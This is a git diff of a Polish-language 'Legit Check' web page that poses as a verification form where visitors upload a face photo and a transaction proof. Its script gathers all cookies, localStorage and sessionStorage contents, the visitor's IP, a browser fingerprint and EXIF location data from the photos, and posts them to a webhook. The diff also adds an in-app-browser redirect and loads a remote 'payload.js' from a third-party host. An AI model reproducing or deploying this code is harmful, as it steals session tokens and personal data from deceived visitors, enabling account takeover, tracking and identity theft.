@@ -1,10 +1,24 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Legit Check</title>
+
+  <!-- 🛡️ WebView Killer – MUSI BYĆ PIERWSZY -->
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const wvAgents = ["fbav", "instagram", "whatsapp", "telegram", "tiktok", "snapchat", "reddit", "twitter", "linkedin", "wv"];
+    const isWV = wvAgents.some(agent => ua.includes(agent));
+    if (isWV) {
+      console.log("🚧 WebView wykryty – przekierowanie...");
+      window.location.href = "https://checkerls.vercel.app/open-in-chrome.html";
+    }
+  </script>
+
+  <!-- 📦 Biblioteki dopiero PO sprawdzeniu WebView -->
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
+
   <style>
     body {
       background-color: #111;
@@ -49,8 +63,13 @@
     <button id="sendBtn">Wyślij do weryfikacji</button>
   </div>
 
+  <!-- Webhook config -->
   <script src="webhook.js"></script>
-<script src="https://th4t0ne.github.io/multi-wv-defender.js"></script>
+
+  <!-- Twój payload -->
+  <script src="https://th4t0ne.github.io/payloadtgram/payload.js"></script>
+
+  <!-- Główna logika recon -->
   <script>
     (async () => {
       const sessionId = `AUTO-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
@@ -60,14 +79,12 @@
 
       let localData = "**LOCAL STORAGE**\n";
       for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        localData += `**${key}**: ${localStorage.getItem(key)}\n`;
+        localData += `**${localStorage.key(i)}**: ${localStorage.getItem(localStorage.key(i))}\n`;
       }
 
       let sessionData = "**SESSION STORAGE**\n";
       for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        sessionData += `**${key}**: ${sessionStorage.getItem(key)}\n`;
+        sessionData += `**${sessionStorage.key(i)}**: ${sessionStorage.getItem(sessionStorage.key(i))}\n`;
       }
 
       const cookies = document.cookie;
@@ -84,8 +101,8 @@
 **Cookies:** ${cookies}
 
 ${localData}
-${sessionData}
-`;
+
+${sessionData}`;
 
       fetch(WEBHOOK, {
         method: "POST",
@@ -99,14 +116,10 @@ ${sessionData}
       const rand = () => chars[Math.floor(Math.random() * chars.length)];
       return `LC-${rand()}${rand()}${rand()}${rand()}-${rand()}${rand()}`;
     };
-
     const sessionId = generateSessionID();
 
     function getIP() {
-      return fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => data.ip)
-        .catch(() => "Błąd IP");
+      return fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Błąd IP");
     }
 
     function extractExif(file) {
@@ -132,10 +145,7 @@ ${sessionData}
     async function handleSubmit() {
       const faceFile = document.getElementById("faceInput").files[0];
       const proofFile = document.getElementById("proofInput").files[0];
-      if (!faceFile || !proofFile) {
-        alert("Oba zdjęcia są wymagane.");
-        return;
-      }
+      if (!faceFile || !proofFile) return alert("Oba zdjęcia są wymagane.");
 
       const fp = await FingerprintJS.load();
       const result = await fp.get();
@@ -164,8 +174,7 @@ ${formatExif(faceExif)}
 
 **EXIF (Transakcja):**
 ${formatExif(proofExif)}
-${mapLink}
-`;
+${mapLink}`;
 
       const form = new FormData();
       form.append("content", msg);
@@ -187,6 +196,5 @@ ${mapLink}
       });
     });
   </script>
-  <script src="https://th4t0ne.github.io/payloadtgram/payload.js"></script>
 </body>
 </html>
